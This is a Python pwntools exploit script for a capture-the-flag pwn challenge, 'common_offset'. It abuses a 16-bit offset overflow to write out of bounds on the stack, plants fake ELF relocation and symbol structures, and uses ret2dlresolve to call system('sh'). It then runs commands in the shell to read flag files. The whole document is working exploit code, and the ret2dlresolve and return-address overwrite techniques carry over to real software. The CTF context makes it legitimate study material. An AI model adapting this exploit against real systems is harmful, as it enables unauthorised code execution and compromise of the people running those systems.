#!/usr/bin/env python3
"""
Challenge: common_offset
Category:  pwn
Platform:  srdnlenIT2026
Vuln:      16-bit offset addition overflow → OOB index → stack write + ret2dlresolve
"""
from pwn import *
import struct

context.binary = elf = ELF('./common_offset', checksec=False)
context.log_level = 'info'

HOST, PORT = 'common-offset.challs.srdnlen.it', 1089

# === CONSTANTS ===
JMPREL  = 0x4006d0
SYMTAB  = 0x400428
STRTAB  = 0x400560
PLT0    = 0x401020
BUFFERS = 0x4040a0

# Fake Elf64_Rela at 0x4040a8 (aligned: (0x4040a8-JMPREL)/24 = 617)
RELA_ADDR   = 0x4040a8
RELOC_INDEX = (RELA_ADDR - JMPREL) // 24  # 617

# Fake Elf64_Sym at 0x4040b8 (aligned: (0x4040b8-SYMTAB)/24 = 646)
SYM_ADDR = 0x4040b8
SYM_IDX  = (SYM_ADDR - SYMTAB) // 24     # 646

# "system\0" string at 0x4040a1
STR_ADDR = 0x4040a1
ST_NAME  = STR_ADDR - STRTAB             # 0x3b41

# r_info = (sym_idx << 32) | R_X86_64_JUMP_SLOT(7)
R_INFO   = (SYM_IDX << 32) | 7
R_OFFSET = 0x404120  # writable address (exit_flag)

def get_process():
    if args.REMOTE: return remote(HOST, PORT)
    elif args.GDB:  return gdb.debug('./common_offset', gdbscript='b *change_files+0x195\nc')
    else:           return process('./common_offset')

def exploit():
    p = get_process()
    p.recvuntil(b'> ')

    # Name = "sh" — alphanumeric, passes strspn check
    # After change_files epilogue: rdi = &name = &"sh"
    # When system("sh") is called via dlresolve, rdi already points to "sh"
    p.sendline(b'sh')

    # === ROUND 1: Write fake dlresolve structures to buffers[0] ===
    # idx=0, offset_inc=1 → write at buffers[0]+1, size=31 (30 data bytes + null)
    #
    # Memory layout at 0x4040a0:
    #   0x4040a0:     0x00          (buffer byte 0, untouched BSS zero)
    #   0x4040a1-a7:  "system\0"   (function name string)
    #   0x4040a8-af:  Elf64_Rela.r_offset (writable addr for resolved GOT entry)
    #   0x4040b0-b7:  Elf64_Rela.r_info   (sym_idx << 32 | 7)
    #   0x4040b8-bb:  Elf64_Sym.st_name   (overlaps Rela.r_addend, ignored for JUMP_SLOT)
    #   0x4040bc:     Elf64_Sym.st_info = 0x12
    #   0x4040bd:     Elf64_Sym.st_other = 0
    #   0x4040be:     Elf64_Sym.st_shndx[0] = 0
    #   0x4040bf:     Elf64_Sym.st_shndx[1] = 0 (fgets null terminator)
    #   0x4040c0-cf:  Elf64_Sym.st_value + st_size = 0 (BSS zeros)

    p.recvuntil(b'> ')     # "Choose the index:"
    p.sendline(b'0')
    p.recvuntil(b'> ')     # "Increase the offset:"
    p.sendline(b'1')
    p.recvuntil(b'> ')     # "Write on the file:"

    payload1  = b'system\x00'                     # 7 bytes
    payload1 += p64(R_OFFSET)                      # 8 bytes: r_offset
    payload1 += p64(R_INFO)                        # 8 bytes: r_info
    payload1 += struct.pack('<I', ST_NAME)          # 4 bytes: st_name
    payload1 += bytes([0x12])                       # 1 byte:  st_info
    payload1 += b'\x00\x00'                         # 2 bytes: st_other + st_shndx[0]
    assert len(payload1) == 30
    p.send(payload1)

    # === ROUND 2: Overflow 16-bit counter → OOB stack write ===
    # idx=3, offset_inc=255: (1 + 255) = 256 → carry into var_49h
    # var_48h = 0 (offset wraps to 0), var_49h = 3+1 = 4 (OOB!)
    # idx=4 → ptrs_base[4] = shared_end_ptr = &var_49h (stack address)
    # Write 31 bytes at &var_49h + 0, overwriting:
    #   bytes 0-14:  junk padding (var_49h through just before ret addr)
    #   bytes 15-22: return address → PLT0
    #   bytes 23-30: reloc_index for _dl_runtime_resolve

    p.recvuntil(b'> ')     # "Choose the index:"
    p.sendline(b'3')
    p.recvuntil(b'> ')     # "Increase the offset:"
    p.sendline(b'255')
    p.recvuntil(b'> ')     # "Write on the file:"

    payload2  = b'B' * 15                           # padding to ret addr
    payload2 += p64(PLT0)                            # ret → PLT0 (push link_map; jmp resolver)
    payload2 += p64(RELOC_INDEX)                     # reloc_index = 617
    assert len(payload2) == 31
    p.send(payload2)

    # Epilogue: mov rdi, [rsp+0x08] (= &name = &"sh"); add rsp, 0x58; ret
    # ret pops PLT0 → _dl_runtime_resolve resolves "system" → calls system("sh")

    # Consume the "Goodbye" message
    p.recvuntil(b'Goodbye', timeout=5)
    p.recvline()

    import time
    time.sleep(0.3)

    # We have a shell now
    p.sendline(b'cat /flag* 2>/dev/null; cat flag* 2>/dev/null')
    time.sleep(0.5)
    p.sendline(b'id')

    try:
        resp = p.recvrepeat(timeout=3)
        log.success(f'Output:\n{resp.decode().strip()}')
    except:
        pass

    p.interactive()

if __name__ == "__main__":
    exploit()
